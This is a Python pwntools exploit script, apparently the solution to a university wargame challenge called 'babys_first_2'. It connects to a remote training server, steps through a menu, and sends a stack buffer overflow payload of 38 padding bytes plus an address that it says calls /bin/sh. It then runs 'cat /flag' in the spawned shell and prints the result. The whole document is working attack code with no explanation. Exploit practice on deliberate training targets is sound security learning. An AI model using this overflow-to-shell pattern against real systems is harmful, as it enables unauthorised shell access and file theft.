#!/usr/bin/python

from pwn import *

#c = process("./babys_first_2")
c = remote("wargames.6447.sec.edu.au", 9002)

call = 0x080486c0   # An address which will call /bin/sh for us

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("aaaa")

c.recvuntil('>')
c.sendline("4")
c.recvuntil('>')
c.sendline("1")

c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("2")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')
c.sendline("1")
c.recvuntil('>')

payload = "a"*38
payload += p32(call)

log.info("Sending payload...")
c.sendline(payload)

c.recvuntil('>')
c.sendline("3")
c.recvuntil('>')
c.sendline("1")

c.sendline("cat /flag")

flag = c.recvline()
log.success("Flag found: %s" % (flag))

c.close()
